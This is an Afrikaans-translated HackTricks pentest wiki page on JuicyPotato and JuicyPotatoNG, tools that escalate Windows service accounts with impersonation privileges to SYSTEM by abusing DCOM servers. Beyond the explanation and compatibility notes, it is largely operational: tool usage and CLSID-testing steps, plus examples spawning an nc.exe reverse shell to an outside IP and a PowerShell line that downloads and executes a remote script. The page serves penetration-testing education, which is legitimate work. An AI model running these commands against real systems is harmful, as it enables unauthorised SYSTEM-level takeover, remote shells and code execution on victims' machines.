# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato is verouderd. Dit werk oor die algemeen op Windows weergawes tot en met Windows 10 1803 / Windows Server 2016. Microsoft-wysigings wat begin met Windows 10 1809 / Server 2019 het die oorspronklike tegniek gebreek. Vir daardie builds en nuwer, oorweeg moderne alternatiewe soos PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato en ander. Sien die bladsy hieronder vir bygewerkte opsies en gebruikswyse.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (misbruik van die goue voorregte) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### Jy kan juicypotato aflaai vanaf [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- Werk betroubaar tot Windows 10 1803 en Windows Server 2016 wanneer die huidige konteks SeImpersonatePrivilege of SeAssignPrimaryTokenPrivilege het.
- Gebreek deur Microsoft-hardening in Windows 10 1809 / Windows Server 2019 en later. Gebruik eerder die alternatiewe hierbo vir daardie builds.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

Ons het besluit om [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) te bewapen: Maak kennis met Juicy Potato.

> Vir die teorie, sien [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) en volg die ketting van skakels en verwysings.

Ons het ontdek dat, anders as `BITS`, daar verskeie COM-bedieners is wat ons kan misbruik. Hulle hoef net te:

1. deur die huidige gebruiker geïnstantieerbaar te wees, gewoonlik 'n “service user” wat impersonasie-voorregte het
2. die `IMarshal` interface te implementeer
3. as 'n verhoogde gebruiker te hardloop (SYSTEM, Administrator, …)

Na enkele toetse het ons 'n uitgebreide lys van [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) op verskeie Windows-weergawes bekom en getoets.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato laat jou toe om:

- **Target CLSID** _kies enige CLSID wat jy wil._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _jy kan die lys per OS gevind._
- **COM Listening port** _definieer die COM listening port wat jy verkies (in plaas van die marshalled hardcoded 6666)_
- **COM Listening IP address** _bind die server op enige IP_
- **Process creation mode** _afhangend van die geïmpersonifieerde gebruiker se voorregte kan jy kies tussen:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _start 'n uitvoerbare lêer of script as die eksploitasie slaag_
- **Process Argument** _pas die gesteekte prosesargumente aan_
- **RPC Server address** _vir 'n stelselmatige benadering kan jy na 'n eksterne RPC-server autentiseer_
- **RPC Server port** _nuttig as jy na 'n eksterne bediener wil autentiseer en die firewall poort `135` blokkeer…_
- **TEST mode** _hoofsaaklik vir toetsdoeleindes, d.w.s. toets CLSID's. Dit skep die DCOM en druk die gebruiker van die token. Sien_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Gebruik <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Afsluitende gedagtes <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

As die gebruiker die `SeImpersonate` of `SeAssignPrimaryToken` voorregte het, is jy **SYSTEM**.

Dit is byna onmoontlik om die misbruik van al hierdie COM Servers te voorkom. Jy kan oorweeg om die permissies van hierdie objekte via `DCOMCNFG` te wysig, maar sterkte — dit gaan uitdagend wees.

Die werklike oplossing is om sensitiewe rekeninge en toepassings wat onder die `* SERVICE`-rekeninge loop, te beskerm. Om `DCOM` te stop sou hierdie exploit sekerlik belemmer, maar dit kan 'n ernstige impak op die onderliggende OS hê.

Van: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG herintroduseer 'n JuicyPotato-styl local privilege escalation op moderne Windows deur die volgende te kombineer:
- DCOM OXID resolution na 'n local RPC server op 'n gekose poort, en vermy die ou hardgekodeerde 127.0.0.1:6666 listener.
- 'n SSPI hook om die inkomende SYSTEM-verifikasie te vang en te impersonate sonder om RpcImpersonateClient nodig te hê, wat ook CreateProcessAsUser moontlik maak wanneer slegs SeAssignPrimaryTokenPrivilege beskikbaar is.
- Truuks om DCOM-aktivasiiebeperkings te bevredig (bv. die voormalige INTERACTIVE-groep vereiste wanneer PrintNotify / ActiveX Installer Service klasse geteiken word).

Belangrike notas (gedrag ontwikkel oor verskeie builds):
- September 2022: Die aanvanklike tegniek het gewerk op ondersteunde Windows 10/11 en Server teikens deur die “INTERACTIVE truuk” te gebruik.
- Januarie 2023-opdatering van die outeurs: Microsoft het later die INTERACTIVE truuk geblokkeer. 'n Ander CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) herstel die exploit maar volgens hul pos slegs op Windows 11 / Server 2022.

Basiese gebruik (meer flags in die hulp):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
As jy mik op Windows 10 1809 / Server 2019 waar klassieke JuicyPotato gepatch is, verkies die alternatiewe wat bo-aan gelink is (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, ens.). NG kan situasioneel wees, afhangend van die build en diensstatus.

## Voorbeelde

Let wel: Besoek [this page](https://ohpe.it/juicy-potato/CLSID/) vir 'n lys CLSIDs om te probeer.

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell omgekeerd
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Begin 'n nuwe CMD (as jy RDP-toegang het)

![](<../../images/image (300).png>)

## CLSID Probleme

Dikwels werk die standaard CLSID wat JuicyPotato gebruik **nie** en die exploit misluk. Gewoonlik neem dit verskeie pogings om 'n **werkende CLSID** te vind. Om 'n lys CLSIDs te kry om vir 'n spesifieke bedryfstelsel te probeer, besoek hierdie blad:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Kontroleer CLSIDs**

Eerstens sal jy 'n paar uitvoerbare lêers behalwe juicypotato.exe benodig.

Download [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) en laai dit in jou PS-sessie, en download en voer [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) uit. Daardie script sal 'n lys van moontlike CLSIDs skep om te toets.

Laai dan [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(verander die pad na die CLSID-lys en na die juicypotato-uitvoerbare) af en voer dit uit. Dit sal elke CLSID begin probeer, en **wanneer die poortnommer verander, beteken dit dat die CLSID gewerk het**.

**Kontroleer** die werkende CLSIDs **met die parameter -c**

## Verwysings

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
